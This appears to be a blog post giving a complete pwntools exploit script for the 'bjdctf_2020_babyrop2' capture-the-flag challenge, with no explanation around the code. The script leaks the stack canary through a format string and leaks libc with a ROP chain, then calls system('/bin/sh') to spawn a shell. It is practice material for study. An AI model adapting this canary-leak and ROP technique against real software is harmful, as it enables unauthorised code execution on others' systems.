+++
title = "exp"
date = "2026-03-26"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
```python
from pwn import *
p = process('bjdctf_2020_babyrop2')
libcelf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
poprdiret = 0x0000000000400993
main = 0x00000000004008DA 
pltputs = 0x0000000000400610
gotputs = 0x0000000000601018
p.sendlineafter("I'll give u some gift to help u!\n","%7$p")
canary = int(p.recvuntil("00")[2:],16)
log.success(hex(canary))
payload = (0x20-0x8)*'a' + p64(canary) + p64(0) + p64(poprdiret) + p64(gotputs) + p64(pltputs) + p64(main)
p.sendlineafter("Pull up your sword and tell me u story!\n",payload)
realgots = u64(p.recvuntil("\x7f").ljust(8,'\x00'))
log.success(hex(realgots))
libcbase = realgots - libcelf.symbols['puts']
log.success(hex(libcbase))
system = libcbase + libcelf.symbols['system']
binsh = libcbase + libcelf.search("/bin/sh").next()
p.sendlineafter("I'll give u some gift to help u!\n","1")
payload = (0x20-0x8)*'a' + p64(canary) + p64(0) + p64(poprdiret) + p64(binsh) + p64(system) + p64(main)
p.sendlineafter("Pull up your sword and tell me u story!\n",payload)
p.interactive()

```
